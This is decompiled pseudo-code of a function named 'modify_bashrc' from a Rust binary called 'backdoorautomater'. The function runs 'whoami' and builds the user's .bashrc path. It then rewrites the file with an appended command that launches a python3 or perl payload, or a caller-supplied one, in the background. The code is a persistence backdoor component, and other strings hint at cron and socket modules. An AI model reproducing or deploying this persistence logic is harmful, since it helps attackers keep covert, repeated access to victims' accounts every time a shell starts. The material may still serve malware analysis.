
  fn backdoorautomater::shellscript::modify_bashrc::h273b1bb4da291c9b(arg1: *mut i64, arg2: i8) -> *mut *mut [i8; 0x94]

{
    let mut var_238: *mut *mut [i8; 0x54] = &data_62a890;
    let var_230: i64 = 1;
    let mut var_228: i64 = 8;
    let mut var_220: i128 = {0};
    std::io::stdio::_print::h9670eaecb29bc3fc(&var_238);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_238, 
        "whoami &\n\nTrying to find the .…", 6);
    let var_158: i64 = var_228;
    let mut var_168: i128 = var_238;
    std::process::Command::new::hc59b10cf3f1b2ada(&var_238, "sh-cFailed to execute commandsrc…");
    std::process::Command::arg::h1a6c514e95e1ad22(
        std::process::Command::arg::ha1bca970e684ecbe(&var_238, 
            "-cFailed to execute commandsrc/s…"), 
        &var_168);
    let mut var_308: i128;
    std::process::Command::output::hf2f7777b705db8a9(&var_308);
    let mut var_f0: ();
    core::result::Result$LT$T$C$E$GT$::expect::h4dac3b1149b99667(&var_f0, &var_308);
    core::ptr::drop_in_place$LT$std..process..Command$GT$::h60da061aa1df0d14(&var_238);
    let var_d0: i64;
    let var_c8: size_t;
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_308, var_d0, var_c8);
    let mut rax_2: i64;
    let mut rdx_4: u64;
    rax_2 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_308);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_238, 
        rax_2, rdx_4);
    let var_138: i64 = var_228;
    let mut var_148: i128 = var_238;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_308);
    backdoorautomater::sanitizer::sanitize_system_command::hc9c6071c8b9b108c(&var_148);
    let var_e8: i64;
    let var_e0: size_t;
    alloc::string::String::from_utf8_lossy::h7ed9087fa43d10ad(&var_308, var_e8, var_e0);
    let mut rax_4: i64;
    let mut rdx_6: u64;
    rax_4 = _$LT$alloc..borrow..Cow$LT$B$GT$$u20$as$u20$core..ops..deref..Deref$GT$::deref::ha2c16a4b1cc76445(&var_308);
    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(&var_238, 
        rax_4, rdx_6);
    let var_118: i64 = var_228;
    let mut var_128: i128 = var_238;
    core::ptr::drop_in_place$LT$alloc..borrow..Cow$LT$str$GT$$GT$::hb5385058f177b775(&var_308);
    let zmm0_3: i128 = var_128;
    var_238 = "/home/perl ";
    let result_1: *mut *mut [i8; 0x94] = 6;
    var_228 = zmm0_3;
    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_308, &var_238, 2, 1, 0);
    let var_2f8: u64;
    let var_278: u64 = var_2f8;
    let mut var_288: i128 = var_308;
    let mut r15: i64;
    r15 = 1;
    alloc::str::_$LT$impl$u20$str$GT$::replace::h19a542f01e4bce42(&var_238, *var_288[8], var_2f8);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_288);
    let var_278_1: i64 = var_228;
    var_288 = var_238;
    alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_288, 
        "/.bashrcpython3 all_cronSocketV4…", 8);
    std::fs::File::open::hc9cc0415293bf7f9(&var_238, &var_288);
    let mut result: *mut *mut [i8; 0x94];
    
    if var_238 == 0
    {
        let mut var_78: i128;
        std::io::buffered::bufreader::BufReader$LT$R$GT$::with_capacity::hfc22a243c8e8e3e1(&var_78, 
            0x2000, *var_238[4]);
        let mut var_2a0: i64 = 0;
        let var_298_1: i64 = 8;
        let var_290_1: i64 = 0;
        let var_58: i128;
        var_220 = var_58;
        let var_68: i128;
        var_228 = var_68;
        var_238 = var_78;
        let var_240_1: i64 = -0x7fffffffffffffff;
        let mut rbx_1: *mut i64;
        let mut rbp_1: fn(arg1: *mut size_t, arg2: *mut c_void) -> *mut size_t;
        let mut r15_1: *mut i128;
        
        loop
        {
            _$LT$std..io..Lines$LT$B$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h114c8ea989dd5339(&var_308, &var_238);
            rbp_1 = var_308;
            
            if rbp_1 == var_240_1
            {
                rbx_1 = 1;
                r15_1 = 1;
                core::ptr::drop_in_place$LT$std..io..Lines$LT$std..io..buffered..bufreader..BufReader$LT$std..fs..File$GT$$GT$$GT$::hdb5dfe103db56fee(&var_238);
                let mut var_228_1: i64 = var_278_1;
                var_238 = var_288;
                std::fs::File::create::h8563d56de2c98b4a(&var_308, &var_238);
                
                if var_308 != 0
                {
                    result = *var_308[8];
                    goto 'label_46079e;
                }
                
                let mut fd: i32 = *var_308[4];
                let mut var_2d0: i64;
                let var_2c0: i64;
                let mut var_2b8: i128;
                let mut var_268: i128;
                let mut zmm0_8: i128;
                
                if arg2 == 1
                {
                    zmm0_8 = *arg1.byte_offset(8);
                    var_238 = "python3 all_cronSocketV4SocketV6…";
                    let var_230_2: i64 = 8;
                    var_228_1 = zmm0_8;
                    rbx_1 = 1;
                    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_308, &var_238, 2, 1, 0);
                    var_268 = var_308;
                    alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_268, 
                        " &\n\nTrying to find the .bashrc…", 2);
                    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                        &var_238, "\n\nTrying to find the .bashrc f…", 1);
                    let var_a8_1: i64 = var_228_1;
                    let mut var_b8: i128 = var_238;
                    alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_2a0, &var_b8);
                    let var_228_3: u64 = var_2f8;
                    var_238 = var_268;
                    rbx_1 = 1;
                    alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_2a0, &var_238);
                    _$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::h2e8f7014354aaec8(&var_238, &var_2a0);
                    _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h09279fcf7e353782(&var_2d0, &var_238);
                    
                    if var_2d0 == -0x8000000000000000
                    {
                        'label_460cac:
                        core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$alloc..string..String$GT$$GT$::h89d95cf2cdcb35eb(&var_238);
                        'label_460cb1:
                        rbp_1 = 1;
                        goto 'label_460cc1;
                    }
                    
                    loop
                    {
                        let var_2a8_3: i64 = var_2c0;
                        var_2b8 = var_2d0;
                        _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_308, &var_2b8);
                        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(
                            &var_308, "\n\nTrying to find the .bashrc f…", 1);
                        let result_5: *mut *mut [i8; 0x94] =
                            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_308[8], var_2f8);
                        result = result_5;
                        
                        if result_5 != 0
                        {
                            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_308);
                            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2b8);
                            core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$alloc..string..String$GT$$GT$::h89d95cf2cdcb35eb(&var_238);
                            break;
                        }
                        
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                            &var_308);
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                            &var_2b8);
                        _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h09279fcf7e353782(&var_2d0, &var_238);
                        
                        if var_2d0 == -0x8000000000000000
                        {
                            goto 'label_460cac;
                        }
                    }
                    
                    core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                    goto 'label_4605e0;
                }
                
                let rax_12: u32 = arg2;
                
                if rax_12 == 2
                {
                    zmm0_8 = *arg1.byte_offset(8);
                    var_238 = "perl ";
                    let var_230_1: i64 = 5;
                    var_228_1 = zmm0_8;
                    rbx_1 = 1;
                    alloc::str::join_generic_copy::hc78a65dc4338aaa9(&var_308, &var_238, 2, 1, 0);
                    var_268 = var_308;
                    alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_268, 
                        " &\n\nTrying to find the .bashrc…", 2);
                    _$LT$T$u20$as$u20$alloc..slice..hack..ConvertVec$GT$::to_vec::h4aa1dd8ab670f689(
                        &var_238, "\n\nTrying to find the .bashrc f…", 1);
                    let var_88_1: i64 = var_228_1;
                    let mut var_98: i128 = var_238;
                    alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_2a0, &var_98);
                    let var_228_2: u64 = var_2f8;
                    var_238 = var_268;
                    rbx_1 = 1;
                    alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_2a0, &var_238);
                    _$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::h2e8f7014354aaec8(&var_238, &var_2a0);
                    _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h09279fcf7e353782(&var_2d0, &var_238);
                    
                    if var_2d0 == -0x8000000000000000
                    {
                        'label_460ac8:
                        core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$alloc..string..String$GT$$GT$::h89d95cf2cdcb35eb(&var_238);
                        goto 'label_460cb1;
                    }
                    
                    loop
                    {
                        let var_2a8_2: i64 = var_2c0;
                        var_2b8 = var_2d0;
                        _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_308, &var_2b8);
                        alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(
                            &var_308, "\n\nTrying to find the .bashrc f…", 1);
                        let result_4: *mut *mut [i8; 0x94] =
                            std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_308[8], var_2f8);
                        result = result_4;
                        
                        if result_4 != 0
                        {
                            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_308);
                            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_2b8);
                            core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$alloc..string..String$GT$$GT$::h89d95cf2cdcb35eb(&var_238);
                            break;
                        }
                        
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                            &var_308);
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                            &var_2b8);
                        _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h09279fcf7e353782(&var_2d0, &var_238);
                        
                        if var_2d0 == -0x8000000000000000
                        {
                            goto 'label_460ac8;
                        }
                    }
                    
                    core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                    goto 'label_4605e0;
                }
                
                rbx_1 = 1;
                
                if rax_12 != 3
                {
                    rbp_1 = nullptr;
                    'label_460cc1:
                    core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                    
                    if rbp_1 == 0
                    {
                        core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$alloc..string..String$GT$$GT$::h8814db29c860c5cd(&var_2a0);
                    }
                    
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_128);
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_148);
                    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(
                        &var_f0);
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_168);
                    result = nullptr;
                    goto 'label_460611;
                }
                
                let mut var_48: ();
                _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_48, arg1);
                alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_2a0, &var_48);
                _$LT$alloc..vec..Vec$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..collect..IntoIterator$GT$::into_iter::h2e8f7014354aaec8(&var_238, &var_2a0);
                _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h09279fcf7e353782(&var_2d0, &var_238);
                
                if var_2d0 == -0x8000000000000000
                {
                    'label_4608e4:
                    core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$alloc..string..String$GT$$GT$::h89d95cf2cdcb35eb(&var_238);
                    goto 'label_460cb1;
                }
                
                loop
                {
                    let var_2a8_1: i64 = var_2c0;
                    var_2b8 = var_2d0;
                    _$LT$alloc..string..String$u20$as$u20$core..clone..Clone$GT$::clone::hb1e8eef355dde452(&var_308, &var_2b8);
                    alloc::vec::Vec$LT$T$C$A$GT$::extend_from_slice::h3cce9f7974121c70(&var_308, 
                        "\n\nTrying to find the .bashrc f…", 1);
                    let result_3: *mut *mut [i8; 0x94] =
                        std::io::Write::write_all::h18f2f3ca7c9bcc20(&fd, *var_308[8], var_2f8);
                    result = result_3;
                    
                    if result_3 != 0
                    {
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                            &var_308);
                        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                            &var_2b8);
                        core::ptr::drop_in_place$LT$alloc..vec..into_iter..IntoIter$LT$alloc..string..String$GT$$GT$::h89d95cf2cdcb35eb(&var_238);
                        break;
                    }
                    
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_308);
                    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(
                        &var_2b8);
                    _$LT$alloc..vec..into_iter..IntoIter$LT$T$C$A$GT$$u20$as$u20$core..iter..traits..iterator..Iterator$GT$::next::h09279fcf7e353782(&var_2d0, &var_238);
                    
                    if var_2d0 == -0x8000000000000000
                    {
                        goto 'label_4608e4;
                    }
                }
                
                core::ptr::drop_in_place$LT$std..fs..File$GT$::hb99078073e1bf56b(fd);
                goto 'label_4605e0;
            }
            
            result = *var_308[8];
            
            if rbp_1 == -0x8000000000000000
            {
                break;
            }
            
            let mut var_108: fn(arg1: *mut size_t, arg2: *mut c_void) -> *mut size_t = rbp_1;
            let result_2: *mut *mut [i8; 0x94] = result;
            let var_f8_1: u64 = var_2f8;
            alloc::vec::Vec$LT$T$C$A$GT$::push::h3237d89e60f90e3a(&var_2a0, &var_108);
        }
        
        rbx_1 = 1;
        r15_1 = 1;
        core::ptr::drop_in_place$LT$std..io..Lines$LT$std..io..buffered..bufreader..BufReader$LT$std..fs..File$GT$$GT$$GT$::hdb5dfe103db56fee(&var_238);
        r15_1 = 1;
        'label_46079e:
        core::ptr::drop_in_place$LT$alloc..vec..Vec$LT$alloc..string..String$GT$$GT$::h8814db29c860c5cd(&var_2a0);
        
        if rbp_1 != var_240_1
        {
            core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_288);
        }
    }
    else
    {
        result = result_1;
        core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_288);
    }
    
    'label_4605e0:
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_128);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_148);
    core::ptr::drop_in_place$LT$std..process..Output$GT$::h78d1e539beaf0e46(&var_f0);
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(&var_168);
    'label_460611:
    core::ptr::drop_in_place$LT$alloc..string..String$GT$::h944c33df58684028(arg1);
    result
}
